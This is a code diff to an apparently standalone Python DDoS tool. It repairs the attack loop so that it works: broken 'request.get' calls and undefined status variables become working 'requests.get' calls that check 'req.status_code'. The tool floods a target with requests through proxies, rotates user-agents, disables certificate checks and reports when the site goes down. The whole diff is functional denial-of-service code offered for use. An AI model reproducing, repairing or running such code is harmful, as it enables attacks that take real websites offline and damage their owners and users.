@@ -71,7 +71,7 @@ def attack(target, proxyfile):
             r += 1
             headers = {'user-agent': random.choice(headers_useragents)}
             proxies = {'http': proxyfile,'https': proxyfile}
-            req = request.get(target, headers=headers, proxies=proxies, verify=False)
+            req = requests.get(target, headers=headers, proxies=proxies, verify=False)
             if req.status_code >= 500:
                 print(f"{G}[+] Target Website is down! DDoS attack successful!")
                 answer = input(f"{B}Do you want to continue the attack?(y/n) ")
@@ -82,15 +82,15 @@ def attack(target, proxyfile):
                             r += 1
                             headers = {'user-agent': random.choice(headers_useragents)}
                             proxies = {'http': proxyfile,'https': proxyfile}
-                            req = request.get(target, headers=headers, proxies=proxies, verify=False)
+                            req = requests.get(target, headers=headers, proxies=proxies, verify=False)
                             if req.status_code >= 500:
                                 print(f"{G}[+] Target Website is down! DDoS attack successful!")
-                            elif response_status == 403:
+                            elif req.status_code == 403:
                                 print(f"{R}[!] DDoS attack bloked!!!")
-                            elif response_status >= 200 and response_status < 500:
+                            elif req.status_code >= 200 and req.status_code < 500:
                                 print(f"{Y}[*] Attacking https://example.com, Sending 10000 Request.")
                             else:
-                                print(f"{R}Unexpected status code: {response.status}")
+                                print(f"{R}Unexpected status code: {req.status_code}")
 
                     except requests.exceptions.HTTPError as errh:
                         print(f"{R}HTTP error: {errh}")
@@ -112,12 +112,12 @@ def attack(target, proxyfile):
                     print(f"{Y}Exiting.....")
                     time.sleep(2)
                     break
-            elif response_status == 403:
+            elif req.status_code == 403:
                 print(f"{R}[!] DDoS attack bloked!!!")
-            elif response_status >= 200 and response_status < 500:
+            elif req.status_code >= 200 and req.status_code < 500:
                 print(f"{Y}[*] Attacking https://example.com, Sending 10000 Request.")
             else:
-                print(f"{R}Unexpected status code: {response.status}")
+                print(f"{R}Unexpected status code: {req.status_code}")
 
     except requests.exceptions.HTTPError as errh:
         print(f"{R}HTTP error: {errh}")
